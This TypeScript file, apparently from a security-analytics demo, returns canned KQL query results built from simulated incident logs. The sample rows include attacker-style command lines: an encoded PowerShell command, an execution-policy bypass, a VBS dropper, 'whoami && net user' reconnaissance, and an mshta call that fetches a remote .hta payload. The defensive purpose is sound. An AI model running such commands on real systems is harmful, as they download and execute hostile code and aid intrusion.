export type EntityType = 'user' | 'host' | 'ip' | 'process' | 'country' | 'event_id'

export interface ExtractedEntity {
  type: EntityType
  value: string
}

export interface MockQueryResult {
  columns: string[]
  rows: string[][]
  rowCount: number
  queryTimeMs: number
  sourceTable: string
  extractedEntities: ExtractedEntity[]
}

function ent(type: EntityType, value: string): ExtractedEntity {
  return { type, value }
}

export function generateMockResults(kql: string): MockQueryResult {
  const lower = kql.toLowerCase()

  // ── SigninLogs / identity sign-in events ─────────────────────────────────
  if (
    lower.includes('signinlogs') ||
    lower.includes('aadriskyusers') ||
    lower.includes('failed login') ||
    lower.includes('sign-in') ||
    lower.includes('signin')
  ) {
    return {
      columns: ['TimeGenerated', 'UserPrincipalName', 'IPAddress', 'Location', 'ResultType', 'AppDisplayName'],
      rows: [
        ['2026-05-10 08:23', 'jsmith@corp.com',    '185.220.101.5', 'RU / Moscow',   '50126', 'Microsoft 365'],
        ['2026-05-10 08:21', 'jsmith@corp.com',    '185.220.101.5', 'RU / Moscow',   '50126', 'Azure Portal'],
        ['2026-05-10 08:19', 'jsmith@corp.com',    '185.220.101.5', 'RU / Moscow',   '50053', 'Microsoft 365'],
        ['2026-05-10 07:58', 'mwatson@corp.com',   '194.165.16.3',  'NG / Lagos',    '50074', 'SharePoint Online'],
        ['2026-05-10 05:30', 'svc-backup@corp.com','10.0.2.15',     'US / Virginia', '50126', 'Azure Backup'],
        ['2026-05-10 03:22', 'jdoe@corp.com',      '203.0.113.42',  'CN / Beijing',  '50126', 'Microsoft 365'],
      ],
      rowCount: 6,
      queryTimeMs: 342,
      sourceTable: 'SigninLogs',
      extractedEntities: [
        ent('user', 'jsmith@corp.com'),
        ent('user', 'mwatson@corp.com'),
        ent('user', 'jdoe@corp.com'),
        ent('ip', '185.220.101.5'),
        ent('ip', '194.165.16.3'),
        ent('ip', '203.0.113.42'),
        ent('country', 'RU / Moscow'),
        ent('country', 'NG / Lagos'),
        ent('country', 'CN / Beijing'),
      ],
    }
  }

  // ── DeviceProcessEvents / PowerShell / encoded commands ──────────────────
  if (
    lower.includes('deviceprocessevents') ||
    lower.includes('deviceevents') ||
    lower.includes('processcreation') ||
    lower.includes('powershell') ||
    lower.includes('commandline') ||
    lower.includes('encoded') ||
    lower.includes('-enc')
  ) {
    return {
      columns: ['TimeGenerated', 'DeviceName', 'AccountName', 'FileName', 'ProcessCommandLine', 'SHA256'],
      rows: [
        ['2026-05-10 06:12', 'DESKTOP-42',  'jsmith',    'powershell.exe', '-EncodedCommand aQBmACAoAC...', 'a1b2c3d4e5f6...'],
        ['2026-05-10 05:45', 'DESKTOP-42',  'jsmith',    'cmd.exe',        '/c whoami && net user',          'e5f6a7b8c9d0...'],
        ['2026-05-10 04:31', 'SERVER-DC01', 'admin-svc', 'powershell.exe', '-ExecutionPolicy Bypass -File run.ps1', 'c9d0e1f2a3b4...'],
        ['2026-05-10 03:10', 'DESKTOP-A7B', 'tbrown',    'wscript.exe',    'C:\\Temp\\dropper.vbs',          'f3a4b5c6d7e8...'],
        ['2026-05-10 02:55', 'LAPTOP-F19',  'lgarcia',   'mshta.exe',      'http://185.220.101.5/payload.hta','d7e8f9a0b1c2...'],
      ],
      rowCount: 5,
      queryTimeMs: 287,
      sourceTable: 'DeviceProcessEvents',
      extractedEntities: [
        ent('user', 'jsmith'),
        ent('user', 'admin-svc'),
        ent('user', 'tbrown'),
        ent('host', 'DESKTOP-42'),
        ent('host', 'SERVER-DC01'),
        ent('host', 'DESKTOP-A7B'),
        ent('process', 'powershell.exe'),
        ent('process', 'wscript.exe'),
        ent('ip', '185.220.101.5'),
      ],
    }
  }

  // ── DeviceNetworkEvents / outbound / connection events ───────────────────
  if (
    lower.includes('devicenetworkevents') ||
    lower.includes('networkcommunication') ||
    lower.includes('networkflow') ||
    lower.includes('outbound') ||
    lower.includes('connectionevents')
  ) {
    return {
      columns: ['TimeGenerated', 'DeviceName', 'RemoteIP', 'RemotePort', 'Protocol', 'BytesSent', 'ActionType'],
      rows: [
        ['2026-05-10 07:32', 'DESKTOP-A7B',   '31.13.72.36',   '443', 'TCP', '1,240,832', 'ConnectionSuccess'],
        ['2026-05-10 07:15', 'DESKTOP-A7B',   '31.13.72.36',   '443', 'TCP', '985,421',   'ConnectionSuccess'],
        ['2026-05-10 06:58', 'SERVER-DC01',   '185.220.101.5', '80',  'TCP', '2,108,000', 'ConnectionSuccess'],
        ['2026-05-10 05:44', 'WORKSTATION-07','8.8.8.8',       '53',  'UDP', '512',        'ConnectionSuccess'],
        ['2026-05-10 04:30', 'DESKTOP-42',    '203.0.113.42',  '4444','TCP', '88,000',    'ConnectionSuccess'],
      ],
      rowCount: 5,
      queryTimeMs: 198,
      sourceTable: 'DeviceNetworkEvents',
      extractedEntities: [
        ent('host', 'DESKTOP-A7B'),
        ent('host', 'SERVER-DC01'),
        ent('host', 'WORKSTATION-07'),
        ent('host', 'DESKTOP-42'),
        ent('ip', '31.13.72.36'),
        ent('ip', '185.220.101.5'),
        ent('ip', '203.0.113.42'),
      ],
    }
  }

  // ── IdentityLogonEvents / lateral movement / SMB ─────────────────────────
  if (
    lower.includes('identitylogonevents') ||
    lower.includes('identitylogon') ||
    lower.includes('lateralmovement') ||
    lower.includes('lateral') ||
    lower.includes('smb')
  ) {
    return {
      columns: ['TimeGenerated', 'AccountName', 'DeviceName', 'RemoteDeviceName', 'LogonType', 'Protocol'],
      rows: [
        ['2026-05-10 07:10', 'jsmith',    'DESKTOP-42',  'SERVER-DC01',    'Network', 'SMB'],
        ['2026-05-10 06:55', 'jsmith',    'DESKTOP-42',  'SERVER-FILES01', 'Network', 'SMB'],
        ['2026-05-10 06:40', 'admin-svc', 'SERVER-DC01', 'WORKSTATION-07', 'Network', 'WMI'],
        ['2026-05-10 06:22', 'admin-svc', 'SERVER-DC01', 'DESKTOP-A7B',    'Network', 'SMB'],
      ],
      rowCount: 4,
      queryTimeMs: 221,
      sourceTable: 'IdentityLogonEvents',
      extractedEntities: [
        ent('user', 'jsmith'),
        ent('user', 'admin-svc'),
        ent('host', 'DESKTOP-42'),
        ent('host', 'SERVER-DC01'),
        ent('host', 'SERVER-FILES01'),
        ent('host', 'WORKSTATION-07'),
        ent('host', 'DESKTOP-A7B'),
      ],
    }
  }

  // ── SecurityEvent — new admin creation / privileged changes ──────────────
  if (
    lower.includes('4720') ||
    lower.includes('4728') ||
    lower.includes('local admin') ||
    lower.includes('user account created') ||
    lower.includes('privileged')
  ) {
    return {
      columns: ['TimeGenerated', 'Computer', 'EventID', 'TargetUserName', 'SubjectUserName', 'SubjectDomainName'],
      rows: [
        ['2026-05-10 05:55', 'SERVER-DC01',   '4720', 'svc-backup2', 'admin-svc', 'CORP'],
        ['2026-05-10 04:10', 'WORKSTATION-07','4728', 'svc-backup2', 'admin-svc', 'CORP'],
        ['2026-05-09 23:44', 'SERVER-DC01',   '4720', 'temp-admin',  'SYSTEM',    'CORP'],
      ],
      rowCount: 3,
      queryTimeMs: 156,
      sourceTable: 'SecurityEvent',
      extractedEntities: [
        ent('user', 'svc-backup2'),
        ent('user', 'admin-svc'),
        ent('user', 'temp-admin'),
        ent('host', 'SERVER-DC01'),
        ent('host', 'WORKSTATION-07'),
        ent('event_id', '4720'),
        ent('event_id', '4728'),
      ],
    }
  }

  // ── IdentityInfo / user profile ──────────────────────────────────────────
  if (
    lower.includes('identityinfo') ||
    lower.includes('userinfo') ||
    lower.includes('department') ||
    lower.includes('employee')
  ) {
    return {
      columns: ['UserPrincipalName', 'AccountDisplayName', 'Department', 'JobTitle', 'AccountEnabled', 'LastSeenDate'],
      rows: [
        ['jsmith@corp.com',    'John Smith',    'Engineering',  'Senior Engineer',   'true', '2026-05-10'],
        ['mwatson@corp.com',   'Mike Watson',   'Finance',      'Financial Analyst', 'true', '2026-05-10'],
        ['jdoe@corp.com',      'Jane Doe',      'Marketing',    'Campaign Manager',  'true', '2026-05-09'],
        ['tbrown@corp.com',    'Tom Brown',     'IT',           'Systems Admin',     'true', '2026-05-10'],
        ['admin-svc@corp.com', 'Service Admin', 'IT',           'Service Account',   'true', '2026-05-10'],
      ],
      rowCount: 5,
      queryTimeMs: 89,
      sourceTable: 'IdentityInfo',
      extractedEntities: [
        ent('user', 'jsmith@corp.com'),
        ent('user', 'mwatson@corp.com'),
        ent('user', 'jdoe@corp.com'),
        ent('user', 'tbrown@corp.com'),
      ],
    }
  }

  // ── Generic fallback — SecurityEvent / AuditLogs ─────────────────────────
  return {
    columns: ['TimeGenerated', 'Computer', 'EventID', 'AccountName', 'Activity'],
    rows: [
      ['2026-05-10 08:00', 'SERVER-DC01',    '4624', 'jsmith',     'Successful logon'],
      ['2026-05-10 07:45', 'DESKTOP-42',     '4688', 'jsmith',     'Process created: powershell.exe'],
      ['2026-05-10 07:30', 'WORKSTATION-07', '4625', 'admin',      'Failed logon — account locked'],
      ['2026-05-10 06:45', 'SERVER-DC01',    '4728', 'admin-svc',  'Member added to security group'],
      ['2026-05-10 05:55', 'DESKTOP-42',     '4720', 'svc-backup', 'User account created'],
    ],
    rowCount: 5,
    queryTimeMs: 312,
    sourceTable: 'SecurityEvent',
    extractedEntities: [
      ent('user', 'jsmith'),
      ent('user', 'admin-svc'),
      ent('user', 'admin'),
      ent('host', 'SERVER-DC01'),
      ent('host', 'DESKTOP-42'),
      ent('host', 'WORKSTATION-07'),
      ent('event_id', '4624'),
      ent('event_id', '4688'),
      ent('event_id', '4728'),
    ],
  }
}
